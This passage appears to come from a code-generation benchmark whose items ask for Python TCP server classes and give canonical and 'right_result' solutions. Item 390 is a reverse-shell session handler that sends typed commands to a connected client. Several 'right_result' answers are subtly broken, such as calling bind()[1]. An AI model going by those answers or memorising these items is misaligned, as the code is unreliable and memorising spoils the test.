    "Canonical_solution": "import socket\nimport json\nfrom typing import Optional, Dict, Any\nimport numpy as np\n\nclass GodotTCPCommunicator:\n    DEFAULT_PORT = 11008\n    DEFAULT_TIMEOUT = 60\n\n    def __init__(self, port: int = DEFAULT_PORT):\n        self.port = port\n        self.connection = self._start_server()\n\n    def _start_server(self):\n        print(f\"waiting for remote GODOT connection on port {self.port}\")\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        server_address = (\"127.0.0.1\", self.port)\n        sock.bind(server_address)\n        sock.listen(1)\n        sock.settimeout(self.DEFAULT_TIMEOUT)\n        connection, client_address = sock.accept()\n        print(\"connection established\")\n        return connection\n\n    def _send_as_json(self, dictionary: Dict[str, Any]):\n        message_json = json.dumps(dictionary)\n        self._send_string(message_json)\n\n    def _get_json_dict(self) -> Dict[str, Any]:\n        data = self._get_data()\n        return json.loads(data)\n\n    def _get_data(self) -> Optional[str]:\n        try:\n            string_size_bytes = bytearray()\n            received_length = 0\n            length = 4\n\n            while received_length < length:\n                data = self.connection.recv(length - received_length)\n                received_length += len(data)\n                string_size_bytes.extend(data)\n\n            length = int.from_bytes(string_size_bytes, \"little\")\n\n            string_bytes = bytearray()\n            received_length = 0\n\n            while received_length < length:\n                data = self.connection.recv(length - received_length)\n                received_length += len(data)\n                string_bytes.extend(data)\n\n            return string_bytes.decode()\n        except socket.timeout as e:\n            print(\"env timed out\", e)\n            return None\n\n    def _send_string(self, string: str):\n        message = len(string).to_bytes(4, \"little\") + bytes(string.encode())\n        self.connection.sendall(message)\n\n    def close(self):\n        self.connection.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport json\nfrom typing import Dict, Any, Optional\n\nclass GodotTCPCommunicator:\n    DEFAULT_PORT = 11008\n    DEFAULT_TIMEOUT = 60\n\n    def __init__(self, port: int = DEFAULT_PORT) -> None:\n        self.port = port\n        self.connection = self._start_server()\n\n    def _start_server(self) -> socket.socket:\n        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        server_socket.bind(('localhost', self.port))\n        server_socket.listen(1)\n        server_socket.settimeout(self.DEFAULT_TIMEOUT)\n        print(f\"Server listening on port {self.port}...\")\n        client_socket, addr = server_socket.accept()\n        print(f\"Connection established with {addr}\")\n        return client_socket\n\n    def _send_as_json(self, dictionary: Dict[str, Any]) -> None:\n        message = json.dumps(dictionary).encode('utf-8')\n        self.connection.sendall(message)\n\n    def _get_json_dict(self) -> Dict[str, Any]:\n        data = self._get_data()\n        if data is None:\n            return {}\n        return json.loads(data)\n\n    def _get_data(self) -> Optional[str]:\n        try:\n            length = self.connection.recv(4)\n            if not length:\n                return None\n            length = int(length)\n            data = self.connection.recv(length)\n            return data.decode('utf-8')\n        except Exception as e:\n            print(f\"Error receiving data: {e}\")\n            return None\n\n    def _send_string(self, string: str) -> None:\n        message = string.encode('utf-8')\n        self.connection.sendall(str(len(message)).encode('utf-8') + b'\\x00' + message)\n\n    def close(self) -> None:\n        self.connection.close()"
  },
  {
    "Task_id": 381,
    "Instruction": "Task Description: Create a TCP server class that can handle incoming client connections, receive data from clients in a line-based and length-prefixed format, and process the received data in a separate thread.\n\nClass Description: BaseSocket is a TCP server implementation that listens for incoming connections, receives data from clients, and queues the received data for processing. It uses threading to handle connections asynchronously and provides methods for data reception and processing.\n\nAttributes:\nserversocket: [socket.socket] - TCP socket object for server operations\nqueue: [Queue] - Thread-safe queue for storing received data\nt: [Thread] - Thread object for running the server's main loop\ndebug: [bool] - Flag for enabling debug mode\ndisconnect: [bool] - Flag indicating client disconnection status\n\nMethods:\n__init__: [host: str, port: int, debug: bool = False] -> None - Initializes the TCP server, binds to the specified host and port, and starts the server thread\nrecvLine: [sock: socket.socket] -> Tuple[bool, str] - Static method that receives a line of data ending with newline character from a socket\nrecvAll: [sock: socket.socket, l: str] -> str - Static method that receives exact number of bytes specified by length parameter l from a socket\nrun: [] -> None - Main server loop that accepts connections and receives data from clients\nupdate: [] -> None - Processes queued data by calling the main method\nmain: [datas: str] -> None - Placeholder method for processing received data (should be overridden by subclasses)\n__del__: [] -> None - Cleanup method that closes the server socket and joins the thread",
    "Canonical_solution": "import socket\nimport time\nfrom threading import Thread\nfrom queue import Queue\n\nclass BaseSocket:\n    def __init__(self, host, port, debug=False) -> None:\n        self.serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.serversocket.bind((host, port))\n        self.serversocket.listen(1)\n        self.queue = Queue()\n        self.t = Thread(target=self.run)\n        self.t.start()\n        self.debug = debug\n        self.disconnect = False\n    \n    @staticmethod\n    def recvLine(sock):\n        flag = True\n        result = b''\n        while not result.endswith(b'\\n'):\n            res = sock.recv(1)\n            if not res:\n                flag = False\n                break\n            result += res\n        return flag, result.strip().decode('ascii')\n\n    @staticmethod\n    def recvAll(sock, l):\n        l = int(l)\n        result = b''\n        while (len(result) < l):\n            t = sock.recv(l - len(result))\n            result += t\n        return result.decode('ascii')\n\n    def run(self):\n        while True:\n            clientsocket, addr = self.serversocket.accept()\n            self.disconnect = False\n            while True:\n                flag, l = self.recvLine(clientsocket)\n                if not flag:\n                    self.disconnect = True\n                    break\n                data = self.recvAll(clientsocket, l)\n                self.queue.put(data)\n            clientsocket.close()\n    \n    def update(self):\n        time.sleep(1)\n        while not self.queue.empty():\n            data = self.queue.get()\n            self.main(data)\n    \n    def main(self, datas):\n        pass\n\n    def __del__(self):\n        self.serversocket.close()\n        self.t.join()",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport threading\nfrom queue import Queue\n\nclass BaseSocket:\n    def __init__(self, host: str, port: int, debug: bool = False):\n        self.serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.serversocket.bind((host, port))\n        self.serversocket.listen(5)\n        self.queue = Queue()\n        self.t = threading.Thread(target=self.run)\n        self.debug = debug\n        self.disconnect = False\n        self.t.start()\n\n    @staticmethod\n    def recvLine(sock: socket.socket) -> tuple[bool, str]:\n        try:\n            data = sock.recv(1024).decode('utf-8')\n            if '\\n' in data:\n                return True, data.split('\\n')[0]\n            return True, data\n        except Exception as e:\n            return False, str(e)\n\n    @staticmethod\n    def recvAll(sock: socket.socket, l: int) -> str:\n        data = b''\n        while len(data) < l:\n            packet = sock.recv(l - len(data))\n            if not packet:\n                return ''\n            data += packet\n        return data.decode('utf-8')\n\n    def run(self):\n        while not self.disconnect:\n            try:\n                clientsocket, clientaddress = self.serversocket.accept()\n                threading.Thread(target=self.handle_client, args=(clientsocket,)).start()\n            except Exception as e:\n                if self.debug:\n                    print(f\"Error accepting connection: {e}\")\n\n    def handle_client(self, clientsocket):\n        while not self.disconnect:\n            line, success = BaseSocket.recvLine(clientsocket)\n            if not success:\n                break\n            self.queue.put(line)\n        clientsocket.close()\n\n    def update(self):\n        while not self.disconnect:\n            if not self.queue.empty():\n                data = self.queue.get()\n                self.main(data)\n            else:\n                break\n\n    def main(self, datas: str) -> None:\n        pass\n\n    def __del__(self):\n        self.disconnect = True\n        self.t.join()\n        self.serversocket.close()"
  },
  {
    "Task_id": 383,
    "Instruction": "Task Description: Implement a TCP server in Python that listens for incoming client connections, accepts a connection, and provides functionality to send messages to the connected client.\n\nFunction Description: The code consists of two functions: `receive_connection` and `send_message`. The `receive_connection` function creates a TCP socket, binds it to a specified port, listens for incoming connections, and returns the connected client socket. The `send_message` function sends a message to the connected client and closes the connection.\n\nInput: \n- `receive_connection`: None\n- `send_message`: \n  - `client`: socket.socket - The connected client socket\n  - `message`: str (optional) - The message to send to the client (default is an empty string)\n\nOutput: \n- `receive_connection`: socket.socket - The connected client socket\n- `send_message`: None",
    "Canonical_solution": "import socket\nimport logging\n\nlogger = logging.getLogger(__name__)\n\ndef receive_connection() -> socket.socket:\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    server.bind((\"0.0.0.0\", 7634))\n    logger.log(9, \"Server listening on 0.0.0.0:7634\")\n\n    server.listen(1)\n    client = server.accept()[0]\n    server.close()\n    logger.log(9, \"Server closed\")\n\n    return client\n\ndef send_message(client: socket.socket, message: str = \"\"):\n    client.send(f\"HTTP/1.1 200 OK\\r\\n\\r\\n{message}\".encode(\"utf-8\"))\n    client.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\n\ndef receive_connection():\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_socket.bind(('localhost', 12345))\n    server_socket.listen(1)\n    client_socket, addr = server_socket.accept()\n    return client_socket\n\ndef send_message(client, message=\"\"):\n    client.send(message.encode())\n    client.close()"
  },
  {
    "Task_id": 384,
    "Instruction": "Task Description: Implement a TCP server class that receives OAuth tokens through a local socket connection, handling the incoming HTTP request and extracting the authorization code or error message.\n\nClass Description: OAuthTokenReceiver is a class that creates a TCP server to listen for OAuth token responses on a specified local port. It handles the HTTP response, extracts the authorization code, and manages error cases.\n\nAttributes:\nport: int - The local port number on which the server will listen for incoming OAuth token responses (default: 31337)\n\nMethods:\nreceive_oauth_token: receive_oauth_token() -> str - Listens for an incoming connection, receives the OAuth token response, sends an HTTP success response, and returns the extracted authorization code. Raises an exception if the response contains an error description.",
    "Canonical_solution": "import socket\nimport re\nimport urllib.parse\n\nclass OAuthTokenReceiver:\n    def __init__(self, port=31337):\n        self.port = port\n\n    def receive_oauth_token(self):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.bind(('127.0.0.1', self.port))\n        sock.listen(1)\n        conn, addr = sock.accept()\n        data = conn.recv(1024)\n        conn.sendall('HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><head><title>Recon-ng</title></head><body>Response received. Return to Recon-ng.</body></html>')\n        conn.close()\n        \n        if 'error_description' in data:\n            error = urllib.parse.unquote_plus(re.search(r'error_description=([^\\s&]*)', data).group(1))\n            raise Exception(error)\n        \n        authorization_code = re.search(r'code=([^\\s&]*)', data).group(1)\n        return authorization_code",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\n\nclass OAuthTokenReceiver:\n    def __init__(self, port=31337):\n        self.port = port\n        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.server_socket.bind(('localhost', self.port))\n        self.server_socket.listen(1)\n    \n    def receive_oauth_token(self):\n        client_socket, addr = self.server_socket.accept()\n        try:\n            request = client_socket.recv(4096).decode('utf-8')\n            if 'Authorization Code' in request:\n                start_idx = request.find('Authorization Code: ') + len('Authorization Code: ')\n                end_idx = request.find('\\r\\n', start_idx)\n                auth_code = request[start_idx:end_idx].strip()\n                response = \"HTTP/1.1 200 OK\\r\\nContent-Type: text/plain\\r\\n\\r\\nAuthorization Code: \" + auth_code\n                client_socket.sendall(response.encode('utf-8'))\n                return auth_code\n            else:\n                raise ValueError(\"Error: No authorization code found in response\")\n        except Exception as e:\n            raise RuntimeError(f\"Error processing OAuth token: {str(e)}\") from e\n        finally:\n            client_socket.close()"
  },
  {
    "Task_id": 385,
    "Instruction": "Task Description: Implement a TCP server and client system in Python using socket programming for handling multiple client connections and echoing received data back to clients.\n\nClass Description: \n\nTCPServer:\nA TCP server class that listens for incoming connections and manages client handlers. It uses socket programming to establish connections and delegates client communication to handler objects.\n\nAttributes:\n- sock: [socket.socket] - The TCP socket object for server operations\n- client_handler: [class] - The handler class to instantiate for each new client\n- handler_list: [list] - List of active client handlers\n\nMethods:\n- __init__(address, client_handler, handler_list) -> [None] - Initializes the server socket, binds to address, and starts listening\n- fileno() -> [int] - Returns the socket's file descriptor for polling\n- wants_to_receive() -> [bool] - Always returns True indicating readiness to accept connections\n- handle_receive() -> [None] - Accepts new connections and adds client handlers to the list\n\nTCPClient:\nBase class for client handlers providing common socket operations and management.\n\nAttributes:\n- sock: [socket.socket] - The client socket object\n- handler_list: [list] - Reference to the server's handler list\n- outgoing: [bytearray] - Buffer for data to be sent\n\nMethods:\n- __init__(sock, handler_list) -> [None] - Initializes client handler with socket and handler list\n- fileno() -> [int] - Returns the socket's file descriptor\n- close() -> [None] - Closes the socket and removes handler from list\n- wants_to_send() -> [bool] - Returns True if there's data to send\n- handle_send() -> [None] - Sends data from outgoing buffer\n\nTCPEchoClient:\nA TCP client handler that echoes received data back to the client.\n\nMethods:\n- wants_to_receive() -> [bool] - Always returns True indicating readiness to receive\n- handle_receive() -> [None] - Receives data and queues it for echoing back, closes connection on empty data",
    "Canonical_solution": "import socket\n\nclass TCPServer:\n    def __init__(self, address, client_handler, handler_list):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)\n        self.sock.bind(address)\n        self.sock.listen(1)\n        self.client_handler = client_handler\n        self.handler_list = handler_list\n\n    def fileno(self):\n        return self.sock.fileno()\n\n    def wants_to_receive(self):\n        return True\n\n    def handle_receive(self):\n        client, addr = self.sock.accept()\n        self.handler_list.append(self.client_handler(client, self.handler_list))\n\nclass TCPClient:\n    def __init__(self, sock, handler_list):\n        self.sock = sock\n        self.handler_list = handler_list\n        self.outgoing = bytearray()\n\n    def fileno(self):\n        return self.sock.fileno()\n\n    def close(self):\n        self.sock.close()\n        self.handler_list.remove(self)\n        \n    def wants_to_send(self):\n        return True if self.outgoing else False\n\n    def handle_send(self):\n        nsent = self.sock.send(self.outgoing)\n        self.outgoing = self.outgoing[nsent:]\n\nclass TCPEchoClient(TCPClient):\n    def wants_to_receive(self):\n        return True\n    \n    def handle_receive(self):\n        data = self.sock.recv(8192)\n        if not data:\n            self.close()\n        else:\n            self.outgoing.extend(data)",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport select\n\nclass TCPServer:\n    def __init__(self, address, client_handler, handler_list):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.sock.bind(address)\n        self.sock.listen(5)\n        self.client_handler = client_handler\n        self.handler_list = handler_list\n\n    def fileno(self):\n        return self.sock.fileno()\n\n    def wants_to_receive(self):\n        return True\n\n    def handle_receive(self):\n        client_sock, client_addr = self.sock.accept()\n        handler = self.client_handler(client_sock, self.handler_list)\n        self.handler_list.append(handler)\n\nclass TCPClient:\n    def __init__(self, sock, handler_list):\n        self.sock = sock\n        self.handler_list = handler_list\n        self.outgoing = bytearray()\n\n    def fileno(self):\n        return self.sock.fileno()\n\n    def close(self):\n        self.sock.close()\n        self.handler_list.remove(self)\n\n    def wants_to_send(self):\n        return len(self.outgoing) > 0\n\n    def handle_send(self):\n        if self.outgoing:\n            self.sock.send(self.outgoing)\n            self.outgoing.clear()\n\nclass TCPEchoClient(TCPClient):\n    def wants_to_receive(self):\n        return True\n\n    def handle_receive(self):\n        data = self.sock.recv(4096)\n        if not data:\n            self.close()\n            return\n        self.outgoing.extend(data)"
  },
  {
    "Task_id": 387,
    "Instruction": "Task Description: Create a TCP server that collects and serves Jetson device statistics using the jtop library, with optional HTTP response formatting.\n\nFunction Description: The function establishes a TCP server that listens for incoming connections. When a client connects, it retrieves system statistics from the Jetson device using jtop, formats them as JSON, and sends them to the client. The function can optionally wrap the JSON data in a basic HTTP response.\n\nInput:\n- host (str, optional): IP address to bind the server to (default: \"127.0.0.1\")\n- port (int, optional): Port number to listen on (default: 65432)\n- http (bool, optional): Flag to enable HTTP response formatting (default: False)\n\nOutput: None (The function runs indefinitely until interrupted or an error occurs, sending data to connected clients but not returning any value)",
    "Canonical_solution": "import socket\nimport json\nfrom jtop import jtop, JtopException\n\ndef jtop_server(host=\"127.0.0.1\", port=65432, http=False):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.bind((host, port))\n    sock.listen(1)\n    \n    try:\n        with jtop() as jetson:\n            while jetson.ok():\n                conn, addr = sock.accept()\n                stats = json.dumps(jetson.stats)\n                if http:\n                    message = \"HTTP/1.1 200 OK\\r\\nHost: {host}:{port}\\r\\nContent-Type: application/json\\r\\nContent-Length: {length}\\r\\n\\r\\n{stats}\"\n                    conn.send(message.format(host=host, port=port, length=len(stats), stats=stats.encode()))\n                else:\n                    conn.send(stats.encode())\n                conn.close()\n    except JtopException as e:\n        print(e)\n    except Exception as e:\n        print(e)\n    finally:\n        sock.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport json\nfrom jtop import jtop\n\ndef start_tcp_server(host=\"127.0.0.1\", port=65432, http=False):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.bind((host, port))\n        s.listen()\n        print(f\"Server listening on {host}:{port}\")\n        while True:\n            conn, addr = s.accept()\n            with conn:\n                print(f\"Connected by {addr}\")\n                try:\n                    with jtop() as j:\n                        stats = j.stats()\n                    if http:\n                        response = \"HTTP/1.1 200 OK\\nContent-Type: application/json\\n\\n\" + json.dumps(stats)\n                        conn.sendall(response.encode())\n                    else:\n                        conn.sendall(json.dumps(stats).encode())\n                except Exception as e:\n                    print(f\"Error: {e}\")\n                    conn.close()"
  },
  {
    "Task_id": 388,
    "Instruction": "Task Description: Create a Python class that implements a simple network server capable of handling TCP, UDP, and raw socket connections. The server should be able to bind to an available port, receive data from clients, and optionally send a predefined response.\n\nClass Description: The MiniTestServer class provides a configurable network server implementation supporting multiple protocols (TCP, UDP, raw). It can operate in silent mode (receive-only) or respond to clients with predefined data. The server automatically binds to an available port and handles one connection at a time.\n\nAttributes:\n- server_socket: [socket.socket] - The active server socket object\n- received: [bytes] - Data received from the client\n- data_to_send: [bytes] - Predefined data to send to clients (default: b\"\\xfe\\xeb\\xda\\xed\")\n- active_port: [int] - The port number the server is currently bound to\n- stay_silent: [bool] - If True, server won't send responses to clients\n- proto: [str] - Protocol type ('tcp', 'udp', or 'raw')\n- host: [str] - Host address to bind to (default: '0.0.0.0')\n- timeout: [int] - Socket timeout in seconds (default: 5)\n\nMethods:\n- __init__(stay_silent=False, proto=\"tcp\", host=\"0.0.0.0\") -> None - Initializes the server with optional parameters for silent mode, protocol type, and host address\n- bind() -> None - Creates and binds the server socket according to the specified protocol, assigns a random available port\n- serve_once() -> None - Handles one client interaction: accepts connection (TCP), receives data, optionally sends response, then closes the connection",
    "Canonical_solution": "import socket\nimport threading\nimport logging\n\nclass MiniTestServer:\n    def __init__(self, stay_silent=False, proto=\"tcp\", host=\"0.0.0.0\"):\n        self.server_socket = None\n        self.received = None\n        self.data_to_send = b\"\\xfe\\xeb\\xda\\xed\"\n        self.active_port = None\n        self.stay_silent = stay_silent\n        self.proto = proto\n        self.host = host\n        self.timeout = 5\n\n    def bind(self):\n        if self.proto == \"tcp\":\n            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        elif self.proto == \"udp\":\n            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        elif self.proto == \"raw\":\n            self.server_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(ETH_P_ALL))\n        else:\n            raise Exception(\"Invalid protocol type: '{0}'\".format(self.proto))\n\n        self.server_socket.bind((self.host, 0))\n        self.active_port = self.server_socket.getsockname()[1]\n\n        if self.proto == \"tcp\":\n            self.server_socket.listen(1)\n\n    def serve_once(self):\n        self.server_socket.settimeout(self.timeout)\n\n        if self.proto == \"tcp\":\n            (client_socket, address) = self.server_socket.accept()\n            client_socket.settimeout(self.timeout)\n            self.received = client_socket.recv(10000)\n\n            if not self.stay_silent:\n                client_socket.send(self.data_to_send)\n\n            client_socket.close()\n        elif self.proto == \"udp\":\n            data, addr = self.server_socket.recvfrom(1024)\n            self.received = data\n            if not self.stay_silent:\n                self.server_socket.sendto(self.data_to_send, addr)\n        elif self.proto == \"raw\":\n            data, addr = self.server_socket.recvfrom(10000)\n            self.received = data\n            if not self.stay_silent:\n                self.server_socket.sendto(self.data_to_send, addr)\n        else:\n            raise Exception(\"Invalid protocol type: '{0}'\".format(self.proto))\n\n        self.server_socket.close()\n        self.server_socket = None\n        self.active_port = None",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\n\nclass MiniTestServer:\n    def __init__(self, stay_silent=False, proto=\"tcp\", host=\"0.0.0.0\"):\n        self.server_socket = None\n        self.received = b''\n        self.data_to_send = b\"\\xfe\\xeb\\xda\\xed\"\n        self.active_port = 0\n        self.stay_silent = stay_silent\n        self.proto = proto\n        self.host = host\n        self.timeout = 5\n\n    def bind(self):\n        if self.proto == \"tcp\":\n            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        elif self.proto == \"udp\":\n            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        elif self.proto == \"raw\":\n            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        else:\n            raise ValueError(\"Invalid protocol type\")\n        self.server_socket.settimeout(self.timeout)\n        self.active_port = self.server_socket.bind((self.host, 0))[1]\n        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n\n    def serve_once(self):\n        if self.proto == \"tcp\":\n            self.server_socket.listen(1)\n            client_socket, addr = self.server_socket.accept()\n            self.received = client_socket.recv(1024)\n            if not self.stay_silent:\n                client_socket.send(self.data_to_send)\n            client_socket.close()\n        elif self.proto == \"udp\":\n            self.server_socket.settimeout(self.timeout)\n            data, addr = self.server_socket.recvfrom(1024)\n            self.received = data\n            if not self.stay_silent:\n                self.server_socket.sendto(self.data_to_send, addr)\n        elif self.proto == \"raw\":\n            data, addr = self.server_socket.recvfrom(1024)\n            self.received = data\n            if not self.stay_silent:\n                self.server_socket.sendto(self.data_to_send, addr)"
  },
  {
    "Task_id": 389,
    "Instruction": "Task Description: Create a TCP server class that handles incoming client connections, receives data, and writes it to a file, with options for debugging and multiprocessing support.\n\nClass Description: EventGeneric is a TCP server implementation that listens for incoming connections, receives byte data from clients, and writes it to a binary file. It supports running in a separate process and provides debugging capabilities through logging.\n\nAttributes:\n- name: str - Identifier for the event instance and log file\n- isDebug: bool - Flag to enable debug logging\n- shared_key: Any - Optional shared key for inter-process communication\n- port: int - TCP port to listen on (auto-assigned if not specified)\n- addr: str - IP address to bind to (defaults to \"0.0.0.0\")\n- file: str - Path to the output binary file\n- logger: logging.Logger - Debug logger instance (only when isDebug=True)\n\nMethods:\n- __init__(addr=None, port=None, name='events', shared_key=None, isDebug=False) -> None - Initializes the TCP server with optional address, port, name, shared key, and debug flag\n- serve() -> None - Main server loop that binds to the socket, accepts connections, and handles data reception\n- spawn(addr=None, port=None, name='events', shared_key=None, isDebug=False) -> Tuple[int, multiprocessing.Process] - Static method to create and start the server in a separate process, returns the port number and process object",
    "Canonical_solution": "import socket\nimport multiprocessing\nimport os\n\nclass EventGeneric:\n    def __init__(self, addr=None, port=None, name='events', shared_key=None, isDebug=False):\n        self.name = name\n        self.isDebug = isDebug\n        self.shared_key = shared_key\n        if port is None:\n            self.port = get_free_port()\n        else:\n            self.port = port\n        if addr is not None:\n            self.addr, _ = addr\n        else:\n            self.addr = \"0.0.0.0\"\n        self.file = f\"./{self.name}.bin\"\n\n    def serve(self):\n        if self.isDebug:\n            self.logger = get_file_logger(self.name, level=\"DEBUG\")\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        local_addr_port = (self.addr, self.port)\n        sock.bind(local_addr_port)\n        sock.listen(1)\n\n        try:\n            conn, addr = sock.accept()\n            if self.isDebug:\n                self.logger.debug(f\"Open connection from {addr[0]}:{addr[1]}\")\n                event_file = open(self.file, \"wb\")\n            try:\n                while True:\n                    data = conn.recv(1, socket.MSG_WAITALL)\n                    if data:\n                        event_file.write(data)\n                    else:\n                        break\n                        raise KeyboardInterrupt\n            except KeyboardInterrupt:\n                pass\n            finally:\n                try:\n                    if self.isDebug:\n                        os.remove(self.file)\n                except OSError:\n                    pass\n                conn.close()\n                if self.isDebug:\n                    self.logger.debug(f\"Close connection from {addr[0]}:{addr[1]}\")\n            sock.close()\n        except KeyboardInterrupt:\n            pass\n        except BrokenPipeError:\n            pass\n        finally:\n            sock.close()\n            if self.isDebug:\n                self.logger.debug(f\"Closed listen on {self.addr}:{self.port}\")\n\n    @staticmethod\n    def spawn(addr=None, port=None, name='events', shared_key=None, isDebug=False):\n        event = EventGeneric(addr, port, name, shared_key, isDebug)\n        p = multiprocessing.Process(target=event.serve)\n        p.start()\n        return event.port, p",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport logging\nimport multiprocessing\nimport os\n\nclass EventGeneric:\n    def __init__(self, addr=None, port=None, name='events', shared_key=None, isDebug=False):\n        self.name = name\n        self.isDebug = isDebug\n        self.shared_key = shared_key\n        self.port = port\n        self.addr = addr if addr else \"0.0.0.0\"\n        self.file = f\"{self.name}.bin\"\n        self.logger = logging.getLogger(self.name) if isDebug else None\n        self._setup_logger()\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self._bind_socket()\n\n    def _setup_logger(self):\n        if self.isDebug:\n            logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')\n            self.logger.setLevel(logging.DEBUG)\n\n    def _bind_socket(self):\n        if self.port is None:\n            self.port = self._find_free_port()\n        self.sock.bind((self.addr, self.port))\n        self.sock.listen(5)\n        self.logger.debug(f\"Server started on {self.addr}:{self.port}\")\n\n    def _find_free_port(self):\n        for port in range(1024, 65535):\n            try:\n                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                s.bind((self.addr, port))\n                s.close()\n                return port\n            except OSError:\n                continue\n        raise Exception(\"No free port found\")\n\n    def serve(self):\n        self.logger.info(\"Starting server loop\")\n        while True:\n            client_sock, client_addr = self.sock.accept()\n            self.logger.debug(f\"Accepted connection from {client_addr}\")\n            data = client_sock.recv(1024)\n            with open(self.file, 'ab') as f:\n                f.write(data)\n            self.logger.debug(f\"Received {len(data)} bytes and wrote to {self.file}\")\n            client_sock.close()\n\n    @staticmethod\n    def spawn(addr=None, port=None, name='events', shared_key=None, isDebug=False):\n        server = EventGeneric(addr, port, name, shared_key, isDebug)\n        process = multiprocessing.Process(target=server.serve)\n        process.start()\n        return port, process"
  },
  {
    "Task_id": 390,
    "Instruction": "Task Description: Implement a TCP server handler class that manages client connections, receives data from clients, and sends commands to connected clients in a threaded environment.\n\nClass Description: TCPHandler is a threaded TCP server that listens on a specified port, accepts client connections, and facilitates bidirectional communication between the server and client. It runs in a separate thread to maintain responsiveness while handling client connections.\n\nAttributes:\n- connected: bool - Indicates whether a client is currently connected\n- port: int - The port number on which the server listens for connections\n- socket: socket.socket - The TCP socket object for server operations\n- client: socket.socket - The client socket object for an active connection\n\nMethods:\n- __init__(port: int) -> None - Initializes the TCP server thread with the specified port\n- run() -> None - Main thread method that binds the socket, listens for connections, and handles incoming data (overrides threading.Thread.run)\n- listen_command() -> None - Listens for user input from the server console and processes commands\n- send_command(cmd: str) -> None - Sends a command string to the connected client\n- kill() -> None - Closes the client connection and server socket cleanly",
    "Canonical_solution": "import socket\nimport threading\nimport logging\n\nclass TCPHandler(threading.Thread):\n    def __init__(self, port):\n        threading.Thread.__init__(self)\n        logging.info(f\"Handler listening on 0.0.0.0:{port}\")\n        self.connected = False\n        self.port = int(port)\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n    def run(self):\n        self.socket.bind(('', self.port))\n        self.socket.listen(5)\n        \n        while True:\n            self.client, address = self.socket.accept()\n            print(f\"Handler> New session from {address[0]}\")\n            self.connected = True\n\n            response = self.client.recv(255)\n            while response != b\"\":\n                print(f\"\\n{response.decode('utf_8', 'ignore').strip()}\\nShell > $ \", end='')\n                response = self.client.recv(255)\n\n    def listen_command(self):\n        if self.connected == True:\n            cmd = input(\"Shell> $ \")\n            if cmd == \"exit\":\n                self.kill()\n                print(\"BYE !\")\n                exit()\n            self.send_command(cmd+\"\\n\\n\")\n\n    def send_command(self, cmd):\n        if self.connected:\n            self.client.sendall(cmd.encode())\n\n    def kill(self):\n        if hasattr(self, 'client'):\n            self.client.close()\n        self.socket.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport threading\n\nclass TCPHandler(threading.Thread):\n    def __init__(self, port: int):\n        super().__init__()\n        self.connected = False\n        self.port = port\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.client = None\n\n    def run(self):\n        self.socket.bind(('localhost', self.port))\n        self.socket.listen(1)\n        print(f\"Server listening on port {self.port}\")\n        while True:\n            self.client, addr = self.socket.accept()\n            self.connected = True\n            print(f\"Client connected from {addr}\")\n            threading.Thread(target=self.handle_client).start()\n\n    def handle_client(self):\n        while self.connected:\n            data = self.client.recv(1024)\n            if not data:\n                break\n            print(f\"Received: {data.decode()}\")\n        self.kill()\n\n    def listen_command(self):\n        while self.connected:\n            cmd = input(\"Enter command: \")\n            if cmd.lower() == 'exit':\n                self.kill()\n                break\n            self.send_command(cmd)\n\n    def send_command(self, cmd: str):\n        if self.client:\n            self.client.sendall(cmd.encode())\n\n    def kill(self):\n        if self.client:\n            self.client.close()\n        self.socket.close()\n        self.connected = False"
  },
  {
    "Task_id": 391,
